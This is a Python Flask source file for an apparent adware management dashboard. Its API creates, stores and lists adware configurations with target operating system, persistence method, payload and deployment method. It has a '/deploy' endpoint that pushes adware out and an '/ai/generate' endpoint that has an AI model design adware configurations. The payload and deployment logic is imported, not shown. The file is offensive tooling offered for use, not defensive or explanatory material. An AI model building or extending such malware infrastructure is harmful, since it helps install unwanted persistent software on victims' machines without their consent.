import logging
from flask import Flask, request, jsonify
from src.adware_manager import AdwareManager
from src.adware_dashboard.core.payload_manager import PayloadManager
from src.adware_dashboard.core.deployment_manager import DeploymentManager
from src.adware_dashboard.core.ai_integration import AIIntegration
from src.adware_dashboard.models import Adware, Payload, DeploymentMethod
from src.adware_dashboard.api.serializers import AdwareSerializer, PayloadSerializer, DeploymentMethodSerializer
from src.adware_dashboard.api.utils import validate_input

def create_api_app(logger: logging.Logger, adware_manager: AdwareManager, payload_manager: PayloadManager, deployment_manager: DeploymentManager, ai_integration: AIIntegration) -> Flask:
    """
    Creates and configures the Flask API application.

    Args:
        logger (logging.Logger): The logger instance to use.
        adware_manager (AdwareManager): The adware manager instance.
        payload_manager (PayloadManager): The payload manager instance.
        deployment_manager (DeploymentManager): The deployment manager instance.
        ai_integration (AIIntegration): The AI integration instance.

    Returns:
        Flask: The configured Flask application.
    """
    app = Flask(__name__)

    @app.route('/adware', methods=['POST'])
    @validate_input(AdwareSerializer)
    def create_adware():
        """
        Creates a new adware configuration.
        """
        data = request.get_json()
        try:
            payload = payload_manager.get_payload(data['payload_id'])
            if not payload:
                return jsonify({'error': f"Payload with ID {data['payload_id']} not found."}), 400

            deployment_method = deployment_manager.get_deployment_method(data['deployment_method_id'])
            if not deployment_method:
                return jsonify({'error': f"Deployment method with ID {data['deployment_method_id']} not found."}), 400

            adware = adware_manager.create_adware(
                name=data['name'],
                description=data['description'],
                target_os=data['target_os'],
                persistence_method=data['persistence_method'],
                payload_id=data['payload_id'],
                deployment_method_id=data['deployment_method_id'],
                config=data['config']
            )
            return jsonify(AdwareSerializer.serialize(adware)), 201
        except ValueError as e:
            return jsonify({'error': str(e)}), 400

    @app.route('/adware/<int:adware_id>', methods=['GET'])
    def get_adware(adware_id):
        """
        Retrieves an adware configuration by its ID.
        """
        adware = adware_manager.get_adware(adware_id)
        if adware:
            return jsonify(AdwareSerializer.serialize(adware)), 200
        return jsonify({'error': 'Adware not found'}), 404

    @app.route('/adware/<int:adware_id>', methods=['PUT'])
    @validate_input(AdwareSerializer, partial=True)
    def update_adware(adware_id):
        """
        Updates an existing adware configuration.
        """
        data = request.get_json()
        try:
            adware = adware_manager.update_adware(adware_id, **data)
            if adware:
                return jsonify(AdwareSerializer.serialize(adware)), 200
            return jsonify({'error': 'Adware not found'}), 404
        except ValueError as e:
            return jsonify({'error': str(e)}), 400

    @app.route('/adware/<int:adware_id>', methods=['DELETE'])
    def delete_adware(adware_id):
        """
        Deletes an adware configuration by its ID.
        """
        if adware_manager.delete_adware(adware_id):
            return jsonify({'message': 'Adware deleted successfully'}), 200
        return jsonify({'error': 'Adware not found'}), 404

    @app.route('/adware', methods=['GET'])
    def list_adware():
        """
        Lists all adware configurations.
        """
        adware_list = adware_manager.list_adware()
        return jsonify([AdwareSerializer.serialize(adware) for adware in adware_list]), 200

    @app.route('/adware/<int:adware_id>/deploy', methods=['POST'])
    def deploy_adware(adware_id):
        """
        Deploys an adware configuration.
        """
        if adware_manager.deploy_adware(adware_id):
            return jsonify({'message': 'Adware deployed successfully'}), 200
        return jsonify({'error': 'Adware not found or deployment failed'}), 404

    @app.route('/payloads', methods=['GET'])
    def list_payloads():
        """
        Lists all available payloads.
        """
        payload_list = payload_manager.list_payloads()
        return jsonify([PayloadSerializer.serialize(payload) for payload in payload_list]), 200

    @app.route('/deployment_methods', methods=['GET'])
    def list_deployment_methods():
        """
        Lists all available deployment methods.
        """
        deployment_method_list = deployment_manager.list_deployment_methods()
        return jsonify([DeploymentMethodSerializer.serialize(deployment_method) for deployment_method in deployment_method_list]), 200

    @app.route('/ai/generate', methods=['POST'])
    def generate_ai_config():
        """
        Generates an adware configuration using the AI model.
        """
        data = request.get_json()
        try:
            config = ai_integration.generate_adware_config(data['goal'], data.get('constraints'))
            return jsonify(config), 200
        except ValueError as e:
            return jsonify({'error': str(e)}), 400

    return app
